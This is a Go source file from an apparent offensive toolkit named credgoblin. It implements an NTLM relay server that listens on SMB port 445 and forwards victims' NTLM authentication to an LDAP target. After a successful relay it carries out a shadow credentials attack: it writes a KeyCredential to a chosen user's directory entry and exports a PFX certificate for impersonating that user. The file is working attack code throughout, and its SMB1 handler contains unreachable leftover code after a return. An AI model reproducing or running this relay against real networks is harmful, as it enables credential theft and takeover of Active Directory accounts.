package relay

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
	"github.com/ineffectivecoder/credgoblin/pkg/shadowcreds"
	"github.com/ineffectivecoder/credgoblin/pkg/smb"
)

// Config holds relay configuration
type Config struct {
	ListenAddr  string
	TargetURL   string
	TargetUser  string
	OutputPath  string
	PFXPassword string
	Verbose     bool
}

// Server represents the relay server
type Server struct {
	config    *Config
	logger    *output.Logger
	listener  net.Listener
	onSuccess func(pfxPath string)
}

// NewServer creates a new relay server
func NewServer(config *Config, logger *output.Logger) *Server {
	return &Server{
		config: config,
		logger: logger,
	}
}

// Start starts the relay server
func (s *Server) Start(ctx context.Context) error {
	addr := s.config.ListenAddr
	if addr == "" {
		addr = "0.0.0.0"
	}

	// Listen on port 445 for SMB
	fullAddr := fmt.Sprintf("%s:445", addr)

	listener, err := net.Listen("tcp", fullAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", fullAddr, err)
	}

	s.listener = listener
	s.logger.Info(fmt.Sprintf("Relay server listening on %s", fullAddr))
	s.logger.Info(fmt.Sprintf("Target: %s", s.config.TargetURL))
	s.logger.Info(fmt.Sprintf("Target user: %s", s.config.TargetUser))

	go s.acceptLoop(ctx)

	return nil
}

// Stop stops the relay server
func (s *Server) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// OnSuccess sets a callback for when relay succeeds
func (s *Server) OnSuccess(callback func(pfxPath string)) {
	s.onSuccess = callback
}

// acceptLoop accepts incoming connections
func (s *Server) acceptLoop(ctx context.Context) {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("Accept error: %v", err))
				continue
			}
		}

		go s.handleConnection(ctx, conn)
	}
}

// handleConnection handles a single connection
func (s *Server) handleConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Info(fmt.Sprintf("New connection from %s", remoteAddr))

	// Create LDAP relay client
	ldapClient := NewLDAPClient(s.config.TargetURL, s.logger)

	// Create relay handler
	handler := &RelayHandler{
		conn:       conn,
		ldapClient: ldapClient,
		targetUser: s.config.TargetUser,
		outputPath: s.config.OutputPath,
		pfxPass:    s.config.PFXPassword,
		logger:     s.logger,
		onSuccess:  s.onSuccess,
	}

	if err := handler.Handle(ctx); err != nil {
		s.logger.Debug(fmt.Sprintf("Relay error from %s: %v", remoteAddr, err))
	}
}

// RelayHandler handles NTLM relay for a single connection
type RelayHandler struct {
	conn       net.Conn
	ldapClient *LDAPClient
	targetUser string
	outputPath string
	pfxPass    string
	logger     *output.Logger
	onSuccess  func(pfxPath string)
}

// Handle performs the relay
func (h *RelayHandler) Handle(ctx context.Context) error {
	// Create a done channel for context cancellation
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close()
		case <-done:
		}
	}()

	// Connect to LDAP
	if err := h.ldapClient.Connect(); err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}
	defer h.ldapClient.Close()

	// Process SMB packets
	for {
		// Read NetBIOS header
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		// Read SMB packet
		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		// Process packet
		response, success, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		// Send response
		if response != nil {
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		// If relay succeeded, perform shadow credentials attack
		if success {
			h.logger.Success("NTLM relay successful!")
			return h.performShadowCredentials()
		}
	}
}

// processPacket processes an SMB packet and relays NTLM
func (h *RelayHandler) processPacket(packet []byte) ([]byte, bool, error) {
	if len(packet) < 4 {
		return nil, false, fmt.Errorf("packet too short")
	}

	// Check if SMB1 or SMB2
	if packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB1Packet(packet)
	} else if packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB2Packet(packet)
	}

	return nil, false, fmt.Errorf("unknown protocol")
}

// processSMB2Packet processes an SMB2 packet
func (h *RelayHandler) processSMB2Packet(packet []byte) ([]byte, bool, error) {
	header, err := smb.ParseSMB2Header(packet)
	if err != nil {
		return nil, false, err
	}

	switch header.Command {
	case smb.SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		// Send negotiate response
		response := smb.BuildNegotiateResponse(header)
		return response, false, nil

	case smb.SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		return h.handleSessionSetupRelay(packet)

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, false, fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// processSMB1Packet processes an SMB1 packet
func (h *RelayHandler) processSMB1Packet(packet []byte) ([]byte, bool, error) {
	// Check if this is a NEGOTIATE request
	if len(packet) >= 5 && packet[4] == 0x72 { // SMB_COM_NEGOTIATE
		h.logger.Debug("Received SMB1 NEGOTIATE, responding with SMB2")

		// Always respond with SMB2 NEGOTIATE (Responder-style)
		// Most modern clients will accept SMB2 even if they don't advertise it
		header := &smb.SMB2Header{MessageID: 0}
		response := smb.BuildNegotiateResponse(header)
		return response, false, nil
	}

	// Other SMB1 commands not supported
	h.logger.Debug("Received unsupported SMB1 command")
	return nil, false, fmt.Errorf("unsupported SMB1 command")
	if len(packet) < 64+9 {
		return nil, false, fmt.Errorf("session setup request too short")
	}

	offset := 64 + 12 // Skip to SecurityBufferOffset field
	securityBufferOffset := binary.LittleEndian.Uint16(packet[offset : offset+2])
	securityBufferLength := binary.LittleEndian.Uint16(packet[offset+2 : offset+4])

	if int(securityBufferOffset)+int(securityBufferLength) > len(packet) {
		return nil, false, fmt.Errorf("security buffer out of bounds")
	}

	securityBlob := packet[securityBufferOffset : securityBufferOffset+securityBufferLength]

	// Unwrap SPNEGO
	ntlmMsg, err := smb.UnwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, false, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	if len(ntlmMsg) < 12 {
		return nil, false, fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		h.logger.Info("Relaying NTLM Type 1 to LDAP...")
		// Forward to LDAP
		type2, err := h.ldapClient.ForwardNegotiate(ntlmMsg)
		if err != nil {
			return nil, false, fmt.Errorf("failed to forward negotiate: %w", err)
		}

		// Wrap in SPNEGO
		spnegoBlob := smb.WrapNTLMInSPNEGO(type2, true)

		// Build SMB2 response
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, false, nil

	case ntlm.NtLmAuthenticate:
		h.logger.Info("Relaying NTLM Type 3 to LDAP...")
		// Forward to LDAP
		err := h.ldapClient.ForwardAuthenticate(ntlmMsg)
		if err != nil {
			h.logger.Error(fmt.Sprintf("LDAP authentication failed: %v", err))
			header, _ := smb.ParseSMB2Header(packet)
			response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
			return response, false, err
		}

		// Authentication successful!
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_SUCCESS, 0x1000000000001, nil)
		return response, true, nil

	default:
		return nil, false, fmt.Errorf("unknown NTLM message type: %d", msgType)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *RelayHandler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}

// performShadowCredentials performs the shadow credentials attack
func (h *RelayHandler) performShadowCredentials() error {
	h.logger.Info("Performing shadow credentials attack...")

	// Generate KeyCredential
	keyCredential, err := shadowcreds.NewKeyCredential()
	if err != nil {
		return fmt.Errorf("failed to generate key credential: %w", err)
	}

	// Build KeyCredential blob
	blob, err := keyCredential.BuildKeyCredentialBlob()
	if err != nil {
		return fmt.Errorf("failed to build key credential blob: %w", err)
	}

	// Modify LDAP
	if err := h.ldapClient.ModifyKeyCredential(h.targetUser, blob); err != nil {
		return fmt.Errorf("failed to modify key credential: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Successfully added shadow credentials to %s", h.targetUser))

	// Generate certificate
	cert, err := keyCredential.GenerateCertificate(h.targetUser)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}

	// Export PFX
	if err := shadowcreds.ExportPFX(keyCredential.PrivateKey(), cert, h.pfxPass, h.outputPath); err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", h.outputPath))

	if h.onSuccess != nil {
		h.onSuccess(h.outputPath)
	}

	return nil
}
